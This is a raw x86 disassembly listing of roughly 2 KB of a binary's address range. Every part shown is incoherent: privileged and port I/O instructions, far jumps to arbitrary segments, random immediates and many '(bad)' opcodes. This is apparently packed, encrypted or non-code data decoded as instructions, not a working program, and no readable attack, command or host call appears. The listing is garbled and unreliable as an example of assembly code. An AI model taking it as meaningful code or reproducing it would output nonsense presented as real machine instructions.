  413af4:	retf   
  413af5:	and    BYTE PTR [edi+0x320e95a9],0xcd
  413afc:	xor    al,0xc3
  413afe:	bound  ecx,QWORD PTR [ebp-0x40b3269]
  413b04:	jmp    0x3af94c6b
  413b09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b0a:	aas    
  413b0b:	inc    edx
  413b0c:	hlt    
  413b0d:	imul   eax,DWORD PTR [ebp+0x25],0x22e46d3f
  413b14:	mov    bl,0x10
  413b16:	push   cs
  413b17:	ins    DWORD PTR es:[edi],dx
  413b18:	add    ebx,DWORD PTR [edi]
  413b1a:	loopne 0x413b25
  413b1c:	and    BYTE PTR [ebx+esi*1],0x5f
  413b20:	scas   al,BYTE PTR es:[edi]
  413b21:	das    
  413b22:	xor    DWORD PTR [ecx+0x40203713],edx
  413b28:	xor    BYTE PTR [eax],0x21
  413b2b:	cmp    al,0xa3
  413b2d:	std    
  413b2e:	add    BYTE PTR [esi+0x22038c73],al
  413b34:	xchg   edx,eax
  413b35:	dec    esp
  413b36:	test   al,0x34
  413b38:	fmul   DWORD PTR [ebx]
  413b3a:	or     ebx,edi
  413b3c:	(bad)  
  413b3d:	int    0xda
  413b3f:	ror    DWORD PTR ds:[edi+0x4b],cl
  413b43:	cmp    ch,bl
  413b45:	dec    edx
  413b46:	xchg   edi,eax
  413b47:	adc    eax,DWORD PTR [esi-0x2c193226]
  413b4d:	loope  0x413b17
  413b4f:	jno    0x413b8d
  413b51:	push   edi
  413b52:	cmovs  eax,DWORD PTR [ebx-0x713bdeaa]
  413b59:	in     al,dx
  413b5a:	dec    ebp
  413b5b:	neg    BYTE PTR [eax+ecx*8-0x7f8c7f9b]
  413b62:	sbb    edi,DWORD PTR [edi-0x160cf201]
  413b68:	ror    DWORD PTR [eax+0x35],cl
  413b6b:	xor    ebp,edx
  413b6d:	int3   
  413b6e:	fmulp  st(4),st
  413b70:	clc    
  413b71:	inc    ebp
  413b72:	dec    ebp
  413b73:	cmp    esp,DWORD PTR [esi]
  413b75:	scas   eax,DWORD PTR es:[edi]
  413b76:	cmp    edx,DWORD PTR [ebx+0x73]
  413b79:	push   ecx
  413b7a:	xor    esi,esp
  413b7c:	mov    esi,0x5f78cf40
  413b81:	sysexit 
  413b83:	shl    dh,cl
  413b85:	(bad)
  413b88:	fistp  QWORD PTR [esp+ecx*8+0x61f92775]
  413b8f:	cmc    
  413b90:	inc    ebp
  413b91:	dec    ebx
  413b92:	into   
  413b93:	pop    ecx
  413b94:	or     BYTE PTR [ebp+ebp*2-0x73],bl
  413b98:	jg     0x413b89
  413b9a:	popf   
  413b9b:	cmp    ecx,DWORD PTR [eax+ebx*2-0x54]
  413b9f:	cmp    bh,bh
  413ba1:	imul   ecx,DWORD PTR [edx+0x4f],0x1133c779
  413ba8:	dec    edi
  413ba9:	jg     0x413c0d
  413bab:	push   es
  413bac:	adc    DWORD PTR [edi+0x28],edi
  413baf:	mov    esi,0x64a3e377
  413bb4:	out    0x82,eax
  413bb6:	stos   DWORD PTR es:[edi],eax
  413bb7:	pusha  
  413bb8:	jmp    0x4520:0x9e96dc50
  413bbf:	jg     0x413bea
  413bc1:	les    ebp,FWORD PTR [edi]
  413bc3:	dec    ebp
  413bc4:	jmp    0xe16c:0x98263e37
  413bcb:	sbb    bl,bh
  413bcd:	out    dx,eax
  413bce:	sahf   
  413bcf:	inc    edx
  413bd0:	mov    ebp,0x716c8d5a
  413bd5:	push   ebp
  413bd6:	adc    eax,DWORD PTR [ecx]
  413bd8:	push   ds
  413bd9:	and    BYTE PTR fs:[ebx-0x70ef5dd0],bh
  413be0:	push   es
  413be1:	ja     0x413c0e
  413be3:	xchg   esi,ecx
  413be5:	sub    al,0x38
  413be7:	push   eax
  413be8:	or     DWORD PTR [edx+0x4725b4f4],eax
  413bee:	cs stc 
  413bf0:	sbb    BYTE PTR [ebx-0x3077ef6f],al
  413bf6:	loopne 0x413bf0
  413bf8:	loop   0x413ba5
  413bfa:	and    ebp,esp
  413bfc:	jg     0x413c31
  413bfe:	jnp    0x413c37
  413c00:	push   ecx
  413c01:	outs   dx,DWORD PTR ds:[esi]
  413c02:	das    
  413c03:	call   0x83201c95
  413c08:	or     eax,0x51be8442
  413c0d:	push   esi
  413c0e:	adc    DWORD PTR ss:[ebp+eax*8-0x5a],esp
  413c13:	sbb    ah,BYTE PTR [esi+0x4bce6292]
  413c19:	pop    ecx
  413c1a:	fnstcw WORD PTR [eax]
  413c1c:	push   esi
  413c1d:	comiss xmm1,DWORD PTR [edx-0x20207a42]
  413c24:	jbe    0x413c61
  413c26:	cdq    
  413c27:	out    dx,al
  413c28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c29:	jnp    0x413bc6
  413c2b:	ins    DWORD PTR es:[edi],dx
  413c2c:	push   ebp
  413c2d:	mov    bl,0xbb
  413c2f:	inc    edx
  413c30:	pushf  
  413c31:	pop    edx
  413c32:	popf   
  413c33:	adc    al,0x92
  413c35:	dec    edi
  413c36:	jecxz  0x413cac
  413c38:	icebp  
  413c39:	jnp    0x413ca7
  413c3b:	push   ebx
  413c3c:	pushf  
  413c3d:	cmp    bh,BYTE PTR [ecx]
  413c3f:	jb     0x413be5
  413c41:	mov    cl,0xcd
  413c43:	in     al,dx
  413c44:	fld    DWORD PTR [esi+eax*1+0x6d2d6f]
  413c4b:	test   eax,0x58754f2a
  413c50:	cmp    BYTE PTR [eax+ebx*2+0xb],dh
  413c54:	add    al,dh
  413c56:	mov    esi,0xcd20db6
  413c5b:	pop    ss
  413c5c:	inc    ecx
  413c5d:	out    dx,eax
  413c5e:	cli    
  413c5f:	ins    DWORD PTR es:[edi],dx
  413c60:	pop    edi
  413c61:	and    al,0xc5
  413c63:	jl     0x413cd2
  413c65:	sbb    DWORD PTR [ecx-0x75],edx
  413c68:	or     al,0x17
  413c6a:	pop    ebx
  413c6b:	add    edx,DWORD PTR [edi]
  413c6d:	cmp    eax,0x7b1605ed
  413c72:	jmp    0x8a54fb9
  413c77:	dec    edi
  413c78:	mov    esp,0x16404f31
  413c7d:	mov    eax,ds:0x437e851b
  413c82:	arpl   WORD PTR [ecx],cx
  413c84:	mov    eax,0xa8896b1c
  413c89:	sti    
  413c8a:	mov    WORD PTR [esi-0x18a994d4],cs
  413c90:	cwde   
  413c91:	push   ecx
  413c92:	push   ss
  413c93:	mov    ds:0x61377b69,eax
  413c98:	bound  esi,QWORD PTR [esi+0x1561920f]
  413c9e:	inc    edx
  413c9f:	mov    dh,0x68
  413ca1:	in     al,0xfe
  413ca3:	fdiv   DWORD PTR [ebx-0xd]
  413ca6:	xor    DWORD PTR [eax],0x282622a5
  413cac:	sbb    esi,DWORD PTR [ecx-0x3a]
  413caf:	jl     0x413c61
  413cb1:	call   0xdedfae7f
  413cb6:	stos   DWORD PTR es:[edi],eax
  413cb7:	mov    dl,BYTE PTR [ecx]
  413cb9:	adc    al,0xd9
  413cbb:	cs jae 0x413d20
  413cbe:	jnp    0x413c63
  413cc0:	and    eax,0x578eebe1
  413cc5:	cs cmp eax,0xf81f5f7e
  413ccb:	xor    DWORD PTR fs:[esi],edi
  413cce:	repz jne 0x413d42
  413cd1:	arpl   dx,bp
  413cd3:	loope  0x413ce5
  413cd5:	popf   
  413cd6:	repnz rol BYTE PTR [esi-0x2c],1
  413cda:	neg    bl
  413cdc:	lea    ebp,[esi-0x14]
  413cdf:	inc    edx
  413ce0:	aad    0xd5
  413ce2:	fs mov ebp,0xb446f0f4
  413ce8:	arpl   WORD PTR [edi-0x447c8fab],si
  413cee:	aam    0xd3
  413cf0:	jns    0x413cca
  413cf2:	mov    ebp,0xb33e9ca2
  413cf7:	and    eax,0xb7201681
  413cfc:	int    0xb5
  413cfe:	scas   eax,DWORD PTR es:[edi]
  413cff:	pop    eax
  413d00:	loop   0x413d4b
  413d02:	push   eax
  413d03:	fcmove st,st(1)
  413d05:	dec    ebp
  413d06:	inc    edi
  413d07:	sbb    esi,DWORD PTR [ebx+eiz*4+0x50]
  413d0b:	lds    edx,FWORD PTR [edx]
  413d0d:	(bad)  
  413d0e:	push   eax
  413d0f:	mov    ?,WORD PTR [ebx]
  413d11:	leave  
  413d12:	fs popf 
  413d14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d15:	jecxz  0x413d56
  413d17:	and    BYTE PTR [ecx-0x77],cl
  413d1a:	and    ch,BYTE PTR [edx]
  413d1c:	test   eax,0x3f36ac73
  413d21:	cs push ds
  413d23:	or     BYTE PTR [edi+0x17],cl
  413d26:	fld    QWORD PTR [edi-0x573adea2]
  413d2c:	jp     0x413d07
  413d2e:	jl     0x413d44
  413d30:	mov    BYTE PTR [ebp-0x2ef92503],0xad
  413d37:	xor    eax,0xb351424
  413d3c:	jle    0x413d4d
  413d3e:	retf   0xfe16
  413d41:	sub    DWORD PTR [edi-0x57aa1ef0],ecx
  413d47:	cmp    eax,0xd77e13f2
  413d4c:	shr    DWORD PTR [edx-0x73],1
  413d4f:	pop    eax
  413d50:	das    
  413d51:	adc    dl,BYTE PTR [ecx+ebx*8-0x623f2d5c]
  413d58:	shr    DWORD PTR [ecx+0x5f],cl
  413d5b:	adc    esp,DWORD PTR [edi]
  413d5d:	jge    0x413d07
  413d5f:	lds    edx,FWORD PTR [ebp+edi*8+0x25a16352]
  413d66:	mov    bh,0x74
  413d68:	mov    cl,0x7b
  413d6a:	sti    
  413d6b:	push   0x1062e99c
  413d70:	mov    dl,0xd4
  413d72:	mov    edi,esi
  413d74:	sbb    esi,DWORD PTR [esi+edx*8]
  413d77:	mov    ah,0xec
  413d79:	cmc    
  413d7a:	jo     0x413db6
  413d7c:	jge    0x413da1
  413d7e:	add    DWORD PTR [edx],edi
  413d80:	shl    esi,0x80
  413d83:	dec    ebp
  413d84:	ins    DWORD PTR es:[edi],dx
  413d85:	aam    0x66
  413d87:	(bad)  
  413d88:	dec    eax
  413d89:	mov    ds:0x9609be4e,al
  413d8e:	js     0x413e07
  413d90:	or     DWORD PTR [edi+0x58],0xffffffbf
  413d94:	mov    ds:0x2f9342f1,al
  413d99:	ds jbe 0x413da5
  413d9c:	neg    BYTE PTR [esp+ebx*4]
  413d9f:	aaa    
  413da0:	shl    BYTE PTR [ebx+0x6c],0x91
  413da4:	sbb    ebx,DWORD PTR [esi-0x6a]
  413da7:	(bad)  
  413da9:	and    ecx,ebx
  413dab:	stos   DWORD PTR es:[edi],eax
  413dac:	mov    edx,0x781f8ee2
  413db1:	xchg   ebx,eax
  413db2:	sbb    ebx,DWORD PTR [edi-0x2cc0322b]
  413db8:	neg    BYTE PTR [ecx-0x2e90b31f]
  413dbe:	push   ds
  413dbf:	bound  ebp,QWORD PTR [ebx-0x28]
  413dc2:	fstp   QWORD PTR [ecx]
  413dc4:	fwait
  413dc5:	xchg   DWORD PTR [ebp-0x1d],esi
  413dc8:	and    dl,BYTE PTR [edx]
  413dca:	push   esp
  413dcb:	push   edi
  413dcc:	shl    BYTE PTR [esi],cl
  413dce:	jb     0x413e3f
  413dd0:	inc    esi
  413dd1:	mov    ebp,0x11d65d94
  413dd6:	shl    DWORD PTR [edi+0x1d],1
  413dd9:	test   DWORD PTR [ebx-0x70],0x7eb15b4c
  413de0:	jge    0x413db5
  413de2:	sbb    dl,BYTE PTR [eax-0xd]
  413de5:	mov    DWORD PTR [eax+0x12],ebx
  413de8:	popa   
  413de9:	xchg   edx,eax
  413dea:	lock mov esp,0xa0a282e5
  413df0:	push   0xf
  413df2:	sbb    bh,dh
  413df4:	push   edi
  413df5:	push   cs
  413df6:	std    
  413df7:	cs aaa 
  413df9:	(bad)  
  413dfa:	fld    st(3)
  413dfc:	lea    eax,[esp+ebp*1-0x8efe881]
  413e03:	push   ecx
  413e04:	repnz mov ebx,0x7cd98517
  413e0a:	xor    dh,dl
  413e0c:	xor    dh,ah
  413e0e:	xchg   ebp,eax
  413e0f:	mov    edi,0xbda4c9bd
  413e14:	xchg   ebp,eax
  413e15:	xchg   DWORD PTR [eax],esp
  413e17:	lea    ebx,[ecx+edx*4-0x3b]
  413e1b:	xor    dh,BYTE PTR ds:0x1b079c40
  413e21:	fs call 0x5c7d3658
  413e27:	in     al,0x5d
  413e29:	or     ebp,DWORD PTR [ebp-0x29]
  413e2c:	cwde   
  413e2d:	jmp    0xeaed:0x6b6f41b4
  413e34:	mov    ds:0x9226c6e9,eax
  413e39:	cdq    
  413e3a:	pop    esi
  413e3b:	pop    edx
  413e3c:	mov    ss,WORD PTR [ebp+0x71]
  413e3f:	inc    ebx
  413e40:	mov    ebp,0xc7a0b991
  413e45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e46:	sub    BYTE PTR [edi+0x69ed7c5f],bh
  413e4c:	fstp   DWORD PTR [ecx+0x2e]
  413e4f:	fs cli 
  413e51:	mov    bl,0x54
  413e53:	xlat   BYTE PTR ds:[ebx]
  413e54:	jae    0x413df7
  413e56:	scas   al,BYTE PTR es:[edi]
  413e57:	dec    ebp
  413e58:	jg     0x413de3
  413e5a:	enter  0x93b5,0x55
  413e5e:	add    al,0xc7
  413e60:	xchg   esp,eax
  413e61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e62:	outs   dx,BYTE PTR ds:[esi]
  413e63:	aad    0xa9
  413e65:	jbe    0x413df6
  413e67:	cmp    BYTE PTR ds:0x566e3805,al
  413e6d:	cmp    ebx,DWORD PTR [ebx-0x6edbe136]
  413e73:	dec    ebx
  413e74:	mov    ah,0x79
  413e76:	mul    DWORD PTR ds:0xda9c1361
  413e7c:	mov    dl,0xc9
  413e7e:	xlat   BYTE PTR ds:[ebx]
  413e7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e80:	push   eax
  413e81:	aad    0x3d
  413e83:	lahf   
  413e84:	fwait
  413e85:	rcl    DWORD PTR [esi],cl
  413e87:	jbe    0x413eda
  413e89:	xchg   edi,eax
  413e8a:	int    0x17
  413e8c:	or     edi,DWORD PTR [esi+eiz*4-0x54]
  413e90:	ins    BYTE PTR es:[edi],dx
  413e91:	xchg   edi,eax
  413e92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e93:	sbb    esp,esi
  413e95:	hlt    
  413e96:	or     eax,0x1386c131
  413e9b:	mov    al,0x89
  413e9d:	jl     0x413e4f
  413e9f:	pushf  
  413ea0:	call   0x49562f39
  413ea5:	fwait
  413ea6:	sbb    DWORD PTR [edi],edi
  413ea8:	mov    ds:0x6a457d20,al
  413ead:	ret    
  413eae:	loope  0x413f28
  413eb0:	push   ebx
  413eb1:	push   cs
  413eb2:	jmp    0x413e6e
  413eb4:	outs   dx,DWORD PTR ds:[esi]
  413eb5:	jle    0x413e4b
  413eb7:	out    0xde,eax
  413eb9:	push   esp
  413eba:	ret    0x39f9
  413ebd:	out    dx,al
  413ebe:	cmp    ebp,eax
  413ec0:	and    al,0x87
  413ec2:	add    BYTE PTR [ebp-0x53],cl
  413ec5:	fisttp DWORD PTR [ecx-0x63]
  413ec8:	and    DWORD PTR fs:[edi-0x6c],esi
  413ecc:	daa    
  413ecd:	fldcw  WORD PTR es:[eax+ecx*2+0x280268c0]
  413ed5:	(bad)  
  413ed6:	stos   DWORD PTR es:[edi],eax
  413ed7:	jnp    0x413eab
  413ed9:	mov    ds:0xba117b31,al
  413ede:	mov    ?,esp
  413ee0:	jne    0x413f59
  413ee2:	in     al,dx
  413ee3:	push   ebx
  413ee4:	ret    
  413ee5:	pop    eax
  413ee6:	jbe    0x413ed4
  413ee8:	or     eax,0x3385423c
  413eed:	inc    eax
  413eee:	into   
  413eef:	mov    edi,0x1964cc0d
  413ef4:	mov    DWORD PTR [esi+0x13],eax
  413ef7:	das    
  413ef8:	das    
  413ef9:	mov    ebp,0x9196aff7
  413efe:	xor    eax,0xcf93946f
  413f03:	fdivr  QWORD PTR [ecx]
  413f05:	jge    0x413f7a
  413f07:	gs push ebp
  413f09:	aad    0xd5
  413f0b:	xchg   edi,eax
  413f0c:	xchg   esp,eax
  413f0d:	rol    BYTE PTR [edx-0x4aebea19],cl
  413f13:	jmp    0x413f72
  413f15:	pop    es
  413f16:	or     DWORD PTR [ebx+esi*4+0x7bcbcfe2],esi
  413f1d:	jnp    0x413f4d
  413f1f:	pop    es
  413f20:	in     al,dx
  413f21:	mov    DWORD PTR [ebx+eax*4+0x3dcfefa9],ebx
  413f28:	fchs   
  413f2a:	mov    edx,0xbaa4e5fa
  413f2f:	ss in  eax,0x90
  413f32:	or     eax,0xc10f8f6a
  413f37:	push   ds
  413f38:	mov    bh,0xdd
  413f3a:	out    0x4,eax
  413f3c:	fcom   DWORD PTR [edi]
  413f3e:	cmp    BYTE PTR [ebx+0x2a94ef99],ah
  413f44:	adc    DWORD PTR [eax+0x19],0xf92af6f2
  413f4b:	pop    ecx
  413f4c:	das    
  413f4d:	mov    edi,0x92d8abb8
  413f52:	mov    dh,0x96
  413f54:	and    ebp,DWORD PTR [ecx+0x5d63f5b2]
  413f5a:	push   ecx
  413f5b:	shl    BYTE PTR [ecx],0xc2
  413f5e:	loope  0x413fac
  413f60:	sub    DWORD PTR [ebx],ebp
  413f62:	retf   
  413f63:	sbb    ah,BYTE PTR [eax]
  413f65:	outs   dx,BYTE PTR ds:[esi]
  413f66:	mov    dl,0xfe
  413f68:	and    al,0x47
  413f6a:	pusha  
  413f6b:	inc    edi
  413f6c:	sub    eax,0x823af25a
  413f71:	aad    0x7b
  413f73:	mov    dl,0xf7
  413f75:	jmp    0x70f5:0x97bc4f6b
  413f7c:	inc    edi
  413f7d:	int3   
  413f7e:	push   es
  413f7f:	call   0x75c1:0x58eedce9
  413f86:	mov    ecx,0x47854a3d
  413f8b:	sti    
  413f8c:	mov    bh,0x84
  413f8e:	in     al,dx
  413f8f:	fistp  DWORD PTR [ebx-0x3658ae36]
  413f95:	mov    ah,0xc5
  413f97:	adc    eax,0x5f2f7bb1
  413f9c:	pushf  
  413f9d:	sub    ebp,DWORD PTR [edx+ecx*1]
  413fa0:	fcmovnb st,st(4)
  413fa2:	pop    esi
  413fa3:	push   0x8890c933
  413fa8:	fs jl  0x413f5a
  413fab:	test   al,0x6f
  413fad:	mov    ebx,0x9fe20a17
  413fb2:	jae    0x413f71
  413fb4:	ret    
  413fb5:	cmp    eax,0xa35733f6
  413fba:	push   0xffffff82
  413fbc:	and    BYTE PTR [ebx+0x7f39ce52],ch
  413fc2:	mov    al,0xe1
  413fc4:	outs   dx,DWORD PTR ds:[esi]
  413fc5:	loope  0x41402f
  413fc7:	test   eax,0x2792c87c
  413fcc:	popa   
  413fcd:	call   DWORD PTR [ecx]
  413fcf:	jle    0x413fd2
  413fd1:	in     al,dx
  413fd2:	cmp    dl,bh
  413fd4:	and    ebx,DWORD PTR [edi]
  413fd6:	mov    bh,0xee
  413fd8:	adc    dh,dl
  413fda:	mul    DWORD PTR [edi]
  413fdc:	cmc    
  413fdd:	adc    BYTE PTR [edi+0x1e],dh
  413fe0:	test   ebp,edi
  413fe2:	push   ss
  413fe3:	xor    ch,BYTE PTR [ecx]
  413fe5:	or     BYTE PTR [eax],bl
  413fe7:	into   
  413fe8:	inc    BYTE PTR [esi+0x7f]
  413feb:	test   BYTE PTR [edx+0x4d763bf],dl
  413ff1:	ror    DWORD PTR [ebx+0x2d],1
  413ff4:	pop    ecx
  413ff5:	aaa    
  413ff6:	mov    bl,0xca
  413ff8:	dec    eax
  413ff9:	mov    cl,0x1e
  413ffb:	cwde   
  413ffc:	mov    cl,0xee
  413ffe:	(bad)  
  413fff:	out    dx,eax
  414000:	pop    edi
  414001:	xchg   edx,eax
  414002:	ins    DWORD PTR es:[edi],dx
  414003:	mov    edx,0xa9db0ec0
  414008:	ss cdq 
  41400a:	in     eax,0xc0
  41400c:	lods   eax,DWORD PTR ds:[esi]
  41400d:	in     al,dx
  41400e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41400f:	or     dl,BYTE PTR [ebx+esi*2+0x4c199ca9]
  414016:	in     al,0x28
  414018:	enter  0xab94,0x6b
  41401c:	jno    0x414048
  41401e:	and    eax,DWORD PTR [esi+0x24]
  414021:	add    eax,0x419a3371
  414026:	mov    ebx,0x35150763
  41402b:	xor    BYTE PTR [eax+0x2a],0x58
  41402f:	(bad)  
  414031:	popf   
  414032:	test   ah,al
  414034:	and    cl,BYTE PTR [ebp+0x2990739]
  41403a:	imul   edi,DWORD PTR [eax],0x8115776b
  414040:	fwait
  414041:	push   edi
  414042:	retf   
  414043:	inc    esi
  414044:	jl     0x41404c
  414046:	rcr    al,0x98
  414049:	adc    al,0x60
  41404b:	jbe    0x413fd7
  41404d:	jne    0x413ffc
  41404f:	(bad)  [edx+0xc9f2363]
  414055:	nop
  414056:	pop    ebx
  414057:	inc    ebp
  414058:	fsubp  st(7),st
  41405a:	mov    eax,ds:0x1b857a73
  41405f:	mov    edx,0x29e6baa3
  414064:	xlat   BYTE PTR ds:[ebx]
  414066:	inc    ebx
  414067:	mov    ss,WORD PTR ss:[ebx-0x11]
  41406b:	push   ds
  41406c:	stc    
  41406d:	sub    al,0xc
  41406f:	lock pop ds
  414071:	jecxz  0x4140a6
  414073:	sub    DWORD PTR ds:0xfc613ba4,edx
  414079:	in     eax,dx
  41407a:	inc    ecx
  41407b:	(bad)  
  41407c:	sbb    cl,bl
  41407e:	mov    ch,0x1b
  414080:	mov    dl,0xeb
  414082:	ficomp WORD PTR [ecx-0x5c]
  414085:	jno    0x4140ed
  414087:	sbb    al,0x4a
  414089:	push   esi
  41408a:	or     al,0x6
  41408c:	into   
  41408d:	std    
  41408e:	retf   
  41408f:	loopne 0x4140c4
  414091:	out    dx,al
  414092:	cmp    al,0x17
  414094:	push   0x208d7c67
  414099:	or     BYTE PTR [ebp-0x4851bbd1],ah
  41409f:	lahf   
  4140a0:	aam    0x4d
  4140a2:	cmp    eax,0xcc305ea
  4140a7:	mov    ds:0xdf002213,eax
  4140ac:	xchg   DWORD PTR [ecx],edx
  4140ae:	js     0x414057
  4140b0:	jns    0x414131
  4140b2:	pop    ds
  4140b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140b4:	and    DWORD PTR [ebx+esi*4],ebx
  4140b7:	xlat   BYTE PTR ds:[ebx]
  4140b8:	xchg   ecx,eax
  4140b9:	mov    bl,0xe9
  4140bb:	das    
  4140bc:	(bad)  
  4140bd:	mul    DWORD PTR [edi+0x1a]
  4140c0:	repnz push ss
  4140c2:	pop    es
  4140c3:	mov    edi,0x5462111
  4140c8:	ins    DWORD PTR es:[edi],dx
  4140c9:	clc    
  4140ca:	jmp    0x4140cc
  4140cc:	retf   0xd2cb
  4140cf:	sbb    eax,0xd866acee
  4140d4:	rcl    dl,0xa3
  4140d7:	pop    ecx
  4140d8:	jbe    0x4140a9
  4140da:	push   esp
  4140db:	dec    ebx
  4140dc:	inc    esp
  4140dd:	imul   cl
  4140df:	mov    WORD PTR [esi+0x21],fs
  4140e2:	icebp  
  4140e3:	pop    ss
  4140e4:	imul   esp,edi,0xc2a663ed
  4140ea:	loopne 0x41415a
  4140ec:	mov    al,0x25
  4140ee:	mov    dl,0xf0
  4140f0:	inc    ebx
  4140f1:	xor    ebx,DWORD PTR [esi+0x305c4c78]
  4140f7:	xchg   BYTE PTR [ebx+0x4a5ddc9],dl
  4140fd:	pop    es
  4140fe:	iret   
  4140ff:	push   es
  414100:	sti    
  414101:	iret   
  414102:	bound  ebx,QWORD PTR ss:[esi+0x2c]
  414106:	pusha  
  414107:	int    0x1e
  414109:	jmp    0x41414d
  41410b:	inc    edi
  41410c:	xor    DWORD PTR [edx-0x13],eax
  41410f:	or     cl,BYTE PTR [ecx+0x7e]
  414112:	sbb    al,0x24
  414114:	test   DWORD PTR [edx],ecx
  414116:	mov    esi,eax
  414118:	lahf   
  414119:	enter  0xc4d3,0xba
  41411d:	es push edi
  41411f:	and    bl,BYTE PTR [edi-0x7]
  414122:	test   eax,0x903ade79
  414127:	mov    eax,0x39d1a30c
  41412c:	dec    edx
  41412d:	inc    ecx
  41412e:	out    dx,eax
  41412f:	add    al,0xa2
  414131:	fadd   DWORD PTR [ebx+0x57]
  414134:	sub    eax,0xb3d01008
  414139:	ins    DWORD PTR es:[edi],dx
  41413a:	push   ebp
  41413b:	aad    0x53
  41413d:	int    0x93
  41413f:	pusha  
  414140:	cmp    bx,cx
  414143:	push   ebx
  414144:	or     dh,BYTE PTR [ebx-0x6b]
  414147:	xchg   ebp,eax
  414148:	xor    ah,BYTE PTR [edx+ebp*1]
  41414b:	mov    ecx,0x373d49e3
  414150:	mov    eax,0x21023808
  414155:	pop    ebp
  414156:	or     BYTE PTR [ebx+0x141c62a9],dh
  41415c:	retf   
  41415d:	jg     0x41419a
  41415f:	cld    
  414160:	icebp  
  414161:	mov    al,ds:0x26c38c9b
  414166:	test   DWORD PTR [ecx],0xb9ba84d7
  41416c:	add    DWORD PTR [ecx],edx
  41416e:	inc    edi
  41416f:	mov    al,ds:0xb99cf88
  414174:	ins    DWORD PTR es:[edi],dx
  414175:	pop    ebx
  414176:	call   0x8ca3:0x5443f668
  41417d:	repz push edi
  41417f:	or     esp,DWORD PTR [edi]
  414181:	aaa    
  414182:	or     ah,BYTE PTR [edx+0x1e]
  414185:	or     al,0x2
  414187:	and    dx,si
  41418a:	cdq    
  41418b:	bound  ecx,QWORD PTR [eax-0x7f]
  41418e:	inc    ebp
  41418f:	add    bh,BYTE PTR [eax+0x2e]
  414192:	outs   dx,DWORD PTR ds:[esi]
  414193:	inc    ebp
  414194:	cmc    
  414195:	jle    0x41412e
  414197:	jg     0x4141dd
  414199:	add    al,0x45
  41419b:	addr16 ss fwait
  41419e:	imul   ebp,ebp,0xffffffd9
  4141a1:	rep ins DWORD PTR es:[edi],dx
  4141a3:	shr    BYTE PTR [esi*1+0x34afbfa2],1
  4141aa:	mov    eax,ds:0x6d2a6e78
  4141af:	in     al,0x5d
  4141b1:	xchg   ebx,eax
  4141b2:	fcomp  QWORD PTR [ebp+0x48950272]
  4141b8:	mov    bh,0x83
  4141ba:	dec    edx
  4141bb:	stc    
  4141bc:	mov    ebp,0x735d4adf
  4141c1:	ds in  eax,0xa9
  4141c4:	adc    DWORD PTR [edx],ecx
  4141c6:	xchg   edx,eax
  4141c7:	loop   0x414210
  4141c9:	test   al,0xeb
  4141cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141cc:	pop    eax
  4141cd:	or     DWORD PTR [ebp+0x51],ebp
  4141d0:	mov    bh,0xeb
  4141d2:	mov    edx,DWORD PTR [ecx-0x288cbcb2]
  4141d8:	gs mov al,0xe2
  4141db:	sub    ch,BYTE PTR [edi-0x79d18d0]
  4141e1:	pop    eax
  4141e2:	imul   eax,DWORD PTR [ecx+esi*8-0x4c],0x69
  4141e7:	xor    eax,0x892e839e
  4141ec:	hlt    
  4141ed:	add    eax,0x26cccdf5
  4141f2:	cli    
  4141f3:	mov    cl,0xe3
  4141f5:	dec    ebp
  4141f6:	ret    
  4141f7:	push   ds
  4141f8:	test   al,0xc9
  4141fa:	nop
  4141fb:	pop    esp
  4141fc:	or     DWORD PTR [ecx+ebx*1],edi
  4141ff:	aas    
  414200:	sbb    al,0xa4
  414202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414203:	mov    esi,0xea2b6209
  414208:	popf   
  414209:	mov    ecx,0x968f6df8
  41420e:	pop    esp
  41420f:	mov    eax,ds:0x49975d50
  414214:	sbb    eax,0x589eabe7
  414219:	mov    dl,0x8
  41421b:	xchg   esi,eax
  41421c:	call   0x8836:0x52c0b13c
  414223:	aam    0x55
  414225:	sub    al,0xc0
  414227:	adc    bh,BYTE PTR [eax+0x40]
  41422a:	out    dx,al
  41422b:	outs   dx,DWORD PTR ds:[esi]
  41422c:	push   ebp
  41422d:	sbb    dl,bh
  41422f:	bound  esi,QWORD PTR [edx-0x5a]
  414232:	xchg   edi,eax
  414233:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414234:	push   0x68
  414236:	sub    edi,DWORD PTR [edx]
  414238:	cmp    BYTE PTR [ecx],dl
  41423a:	in     al,0xd5
  41423c:	jl     0x41425f
  41423e:	out    0xac,al
  414240:	sbb    DWORD PTR [edx],0x1f
  414243:	das    
  414244:	jmp    0x27bb7c22
  414249:	fs cdq 
  41424b:	addr16 retf 
  41424d:	int3   
  41424e:	pop    ebp
  41424f:	push   edi
  414250:	push   ebx
  414251:	push   0x135af62
  414256:	rcpps  xmm6,XMMWORD PTR [ecx]
  414259:	popf   
  41425a:	out    dx,eax
  41425b:	pop    esp
  41425c:	jne    0x4141ff
  41425e:	test   eax,0x90b1d133
  414263:	mov    BYTE PTR ds:0xc7f73495,bl
  414269:	mov    edi,0xb16c2201
  41426e:	pop    edi
  41426f:	neg    DWORD PTR [eax+0x11]
  414272:	lahf   
  414273:	cdq    
  414274:	into   
  414275:	(bad)  
  414276:	xor    eax,0x8c988e4a
  41427b:	xchg   dl,cl
  41427d:	add    BYTE PTR ds:0x828063ce,bh
  414283:	bound  ecx,QWORD PTR [eax]
  414285:	push   ecx
  414286:	fs cmp al,0x84
  414289:	xchg   ecx,eax
  41428a:	push   ds
  41428b:	mov    cl,0xf8
  41428d:	dec    ebx
  41428e:	push   ds
  41428f:	loopne 0x414297
  414291:	dec    eax
  414292:	mov    BYTE PTR [ecx],0x2b
  414295:	sbb    esi,DWORD PTR [eax]
  414297:	stos   BYTE PTR es:[edi],al
  414298:	jo     0x4142e3
  41429a:	jecxz  0x414314
  41429c:	mov    al,BYTE PTR [edi+0x45b42017]
  4142a2:	or     eax,0x1fd32f79
  4142a7:	sti    
  4142a8:	adc    BYTE PTR [edx+0x6956dde3],dl
  4142ae:	fwait
